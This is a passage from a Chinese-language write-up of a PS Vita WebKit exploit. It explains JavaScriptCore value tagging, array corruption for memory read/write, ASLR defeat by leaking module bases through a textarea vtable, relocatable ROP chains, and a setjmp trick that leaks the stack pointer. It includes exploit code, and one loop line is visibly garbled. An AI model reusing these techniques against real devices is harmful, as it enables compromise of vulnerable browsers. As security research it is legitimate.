`0x8000000` 的数据填充 `foo` ，我们只能控制 4 字节，其余的是用于`tag` 的。`tag` 是什么？
    enum { Int32Tag =        0xffffffff };
    enum { BooleanTag =      0xfffffffe };
    enum { NullTag =         0xfffffffd };
    enum { UndefinedTag =    0xfffffffc };
    enum { CellTag =         0xfffffffb };
    enum { EmptyValueTag =   0xfffffffa };
    enum { DeletedValueTag = 0xfffffff9 };
    enum { LowestTag =  DeletedValueTag };
这就是 Webkit JavaScriptCore 如何将不同的类型打包成单个JSValue
结构的：它可以是int，boolean，cell（指向一个对象的指针），null，undefined 或者 double 类型。因此如果我们
写入`54321`，我们只能控制一半的结构，而另一半被设置成 `Int32Tag` 或者 `0xffffffff`。
但是，我们也可以写入`double`类型的值，比如`54321.0`。我们用这种方法控制所有 8
字节，但是还有其他限制（一些浮点指针规范化并不允许写入真正的任意值。否则，你将能够制作`CellTag`并将指针设置成任意值，这是很可怕的。有趣的是，在它确实允许之前，这是第一个[Vita
WebKit exploit](https://www.lolhax.org/2014/10/28/psvita-webkit-for-2-00/)使用过的！CVE-2010-1807）。
因此，我们还是写入 `double` 类型的值吧。
    foo[0] = o;
    var len = u2d(0x80000000, 0x80000000);
    for (var i = 1; i > 4)) & 0xFFFF) | ((((second & 0xFFF) | ((second & 0xF0000) >> 4)) & 0xFFFF) >> 0;
    }
    var vtidx = textarea_addr - 0x70;
    var textareavptr = u32[vtidx / 4];
    SceWebKit_base = textareavptr - 0xabb65c;
    SceLibc_base = read_mov_r12(SceWebKit_base + 0x85F504) - 0xfa49;
    SceLibKernel_base = read_mov_r12(SceWebKit_base + 0x85F464) - 0x9031;
    ScePsp2Compat_base = read_mov_r12(SceWebKit_base + 0x85D2E4) - 0x22d65;
    SceWebFiltering_base = read_mov_r12(ScePsp2Compat_base + 0x2c688c) - 0x9e5;
    SceLibHttp_base = read_mov_r12(SceWebFiltering_base + 0x3bc4) - 0xdc2d;
    SceNet_base = read_mov_r12(SceWebKit_base + 0x85F414) - 0x23ED;
    SceNetCtl_base = read_mov_r12(SceLibHttp_base + 0x18BF4) - 0xD59;
    SceAppMgr_base = read_mov_r12(SceNetCtl_base + 0x9AB8) - 0x49CD;
我们谈谈代码执行吧。在 Vita 上没有 JIT ，也不可能分配 RWX 内存（只允许来自 PlayStation 的 Mobile
App）。因此我们必须在 ROP 中写整个 payload 。
之前的 exploit 使用了一个叫做 `JSoS` 的技术，[点此查看详情](http://acez.re/ps-vita-level-1-webkitties-3/)。然而，浏览器在破坏 `JSArray` 之后变得实在是不稳定，所以我们向尽可能少的运行 JavaScript
代码。
因此，新版本的 [roptool](https://bitbucket.org/DaveeFTW/roptool) 由
[Davee](https://twitter.com/DaveeFTW) 编写，支持 ASLR。这里的基本思想是 roptool 输出中有一些字（一个
word 4 字节）现在具有分配给它们的重定位信息。在重定位 payload
之后，这只是向这些字添加不同的base（`SceWebKit_base`/`SceLibc_base` /等），我们可以正常启动生成的 ROP 链。
### Mitigation 2: Stack-pivot protection
由于固件版本未知，现在有了额外的漏洞缓解实施方案：有时内核将检测你的线程栈指针实际是在其堆栈内的。如果不是的话，整个程序将被杀死。
为了绕过这个情况，我们需要将我们的 ROP 链植入线程堆栈。为了做到这点，我们需要线程栈虚地址。因为ASLR的存在，我们并不知道此地址。
然而我们有内存任意读写。有大量方法泄漏栈指针。我使用 [setjmp](http://man7.org/linux/man-pages/man3/longjmp.3.html)函数。
这便是我们如何调用它的：
    // copy vtable
    for (var i = 0; i < 0x40; i++)
        u32[some_space / 4 + i] = u32[textareavptr / 4 + i];
    u32[vtidx / 4] = some_space;
    // backup our obj
    for (var i = 0; i < 0x30; ++i)
        backup[i] = u32[vtidx/4 + i];
    // call setjmp and leak stack base
    u32[some_space / 4 + 0x4e] = SceLibc_base + 0x14070|1; // setjmp
    corrupted_textarea.scrollLeft = 0; // call setjmp
现在我们的 `corrupted_textarea` 在内存中被 `jmp_buf`
覆盖，此处包含堆栈指针。然后，我们回复如下原始数据。这是为了在我们试图对损坏的 `textarea` 对象做一些事情的时候，JavaScript